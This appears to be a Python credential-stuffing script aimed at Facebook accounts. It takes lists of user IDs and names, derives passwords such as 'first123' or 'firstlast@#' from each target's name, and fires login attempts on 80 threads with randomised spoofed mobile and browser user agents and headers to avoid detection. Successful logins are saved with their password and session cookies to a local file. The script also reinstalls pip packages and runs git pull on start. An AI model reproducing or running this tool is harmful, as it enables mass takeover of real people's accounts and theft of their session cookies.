import os, sys, uuid, re, random, time, string, json, base64
from io import BytesIO

try:

    os.system(
        'pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
    import requests, rich, certifi, pycurl
except:
    os.system("git pull")

    os.system("pip3 install requests rich certifi pycurl")

    import requests, rich, certifi, pycurl

from rich import print
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5{cx}.{cV}"
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def ua():
    rr = random.randint
    aZ = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    rx = random.randrange(1, 999)
    xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
    return xx


def lsb():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=4))
    number = ''.join(random.choices(string.digits, k=1))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)


def referer():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=6))
    number = ''.join(random.choices(string.digits, k=5))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)


def clear():
        os.system("clear")


loop = 0
oks = []
user = []
agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.143 YaBrowser/22.5.0.1843 Yowser/2.5 Safari/537.36"


def Samsung():
    Anderson = random.choice(
        ["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5", "4.4.2", "5.1.1",
         "6.0.1", "9.0.1"])
    model = random.choice(
        ["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F",
         "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F",
         "SM-N9005", "SM-J210F"])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                        "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
    FBAN = fb.split("|")[1]
    platform = fb.split("|")[0]
    ua = f"Dalvik/2.1.0 (Linux; U; Android " + Anderson + "; " + model + " Build/LRX22C) [FBAN/" + FBAN + ";FBAV/" + cho + ".0.0.15.89;FBPN/" + platform + ";FBLC/sv_SE;FBBV/" + vir + ";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/" + model + ";FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=" + str(
        random.choice(range(1, 4))) + ".0,width=" + str(random.choice(range(720, 1500))) + ",height=" + str(
        random.choice(range(1500, 2000))) + "};FB_FW/1;]"
    return ua


def Motorola():
    fb_v1 = str(random.choice(range(111, 555)))  # "+fb_v1+"
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 333333333)))  # "+rdp1+"
    rdp2 = str(random.choice(range(111111111, 333333333)))
    andv = str(random.choice(range(8, 12)))  # "+andv+"
    # modorola
    ua = "Dalvik/2.1.0 (Linux; U; Android " + andv + ".0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/" + fb_v1 + ".0.0.50." + fb_v2 + ";FBPN/com.facebook.katana;FBLC/es_MX;FBBV/" + rdp1 + ";FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/" + andv + ".0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]"

    return ua


def Vivo():
    fb_v1 = str(random.choice(range(111, 555)))  # "+fb_v1+"
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))  # "+rdp1+"
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))  # "+andv+"
    # vivo
    ua = "Dalvik/2.1.0 (Linux; U; Android " + andv + ".1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/" + fb_v1 + ".0.0.16." + fb_v2 + ";FBPN/com.facebook.orca;FBLC/en_US;FBBV/" + rdp1 + ";FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/" + andv + ".1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"

    return ua

def cont(li):
    if li < 10:
        return "0" + str(li)
    else:
        return str(li)


class sort:
    def color(self):
        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
        cx = random.choice(co)
        return cx




def filee():

    print("[b]    [red1][A] [sea_green2]Crack Indian File")
    print("[b]    [red1][B] [spring_green1]Crack BD File")
    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if ask in ["1", "01", "a", "A"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND File Clone")
        time.sleep(2)
        pwx = ["07860786", "57575751", "57575752", "57273200", "59039200", "first123", "first 123", "first1234",
               "First123", "First1234", "first@123", "first last", "First Last", "firstlast", "firstlast123",
               "firstlast1234", "first@#", "first@@", "@first", "@first@", "first12"]

    elif ask in ["2", "02", "b", "B"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD File Clone")
        time.sleep(2)
        pwx = ["first12", "first123", "first1234", "first12345", "first123456", "firstlast", "firstlast123",
               "firstlast1234", "first@123", "first@", "first@@", "first@#", "@first", "@first@", "firstlast12345",
               "firstlast@#", "firstlast@@", "firstlast@", "First123", "First1234", "first last", "First Last",
               "last123", "Name", "name", "name123", "Name", "firstlast12", "FirstLast123", "FirstLast1234",
               "FirstLast@#", "FirstLast@@"]

    else:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Wrong Option")
        time.sleep(2)
        filee()
    print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]/sdcard/File.txt")
    path = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
    try:
        file = open(path, "r").read().splitlines()
    except:
        filee()
    print("[b]     [red1]✗ [chartreuse1]Add Pass  [orange3]▶  [chartreuse1](Y/n)")
    pa = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
    if pa in ["y", "Y", "yes", "Yes", "1"]:
        pwx = []
        print("[b]     [red1]✗ [chartreuse1]Add Limit [orange3]▶  [chartreuse1]Example 10, 15, 20")
        lim = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        for i in range(lim):
            i += 1
            print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]first123,firstlast")
            px = str(input(
                f"\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mPass  {cont(i)} \x1b[38;5;208m ▶ \x1b[38;0;196m "))
            pwx.append(px)
    else:
        print(" Method 1")
        print(" Method 2")
        print(" Method 3")
        print(" Method 4")
        print(" Method 5")
        print(" Method 6 (Best)")
        meth = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
        if meth in ["1", "a", "A"]:
            fb = "mbasic"
        elif meth in ["2", "b", "B"]:
            fb = "x"
        elif meth in ["3", "c", "C"]:
            fb = "p"
        elif meth in ["4", "d", "D"]:
            fb = "touch"
        elif meth in ["5", "e", "E"]:
            fb = "free"
        else:
            fb = "m"
    with ThreadPool(max_workers=80) as heron:
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(file)))
        print(" [b]    [red1]✗ [light_green]Method    [orange3]▶  [light_green]M" + meth)
        for mal in file:
            try:
                uid = mal.split("|")[0]
                name = mal.split("|")[1]
                heron.submit(file_sub, uid, pwx, name, meth, file, fb)
            except:
                pass




def file_sub(uid, pwx, name, meth, file, fb):
    global oks, loop, sys_ua
    session = requests.session()

    try:
        sys.stdout.write(
            f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}M{meth}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        for pw in pwx:
            shadid = ua()
            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                          ls).replace(
                'Name', name).replace('name', name.lower())

            free_fb = session.get(f'https://{fb}.facebook.com').text
            info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                    "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
            uax = shadid
            ver1 = str(random.randrange(1, 99))
            ver2 = str(random.randrange(90, 121))
            lsd = lsb()
            refer = referer()
            dpr = str(random.randrange(2, 6))
            sceme = random.choice(['light', 'dark'])
            had = {
                'Host': f'{fb}.facebook.com',
                'content-length': str(random.randrange(1600, 1800, 10)),
                'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
                'sec-ch-ua-mobile': '?1',
                'user-agent': uax,
                'x-response-format': 'JSONStream',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-lsd': lsd,
                'viewport-width': '360',
                'sec-ch-ua-platform-version': '""',
                'x-requested-with': 'XMLHttpRequest',
                'x-asbd-id': '129477',
                'dpr': dpr,
                'sec-ch-ua-full-version-list': '',
                'sec-ch-ua-model': '""',
                'sec-ch-prefers-color-scheme': sceme,
                'sec-ch-ua-platform': '"Android"',
                'accept': '*/*',
                'origin': f'https://{fb}.facebook.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
                'accept-encoding': 'gzip, deflate, br,',
                'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            session.post(url=url, data=info, headers=had)
            heron_brand = session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                xx = coki.split("c_user=")[1]
                xd = xx[:15]
                print(f"\r\r[SHADID-OK] {xd} <> {ps}\n[Cookies]{coki}")
                open("/sdcard/SD-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                oks.append(xd)
                break

            elif "checkpoint" in heron_brand:
                pass

                # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
            else:
                continue
        loop += 1
    except:

        time.sleep(30)
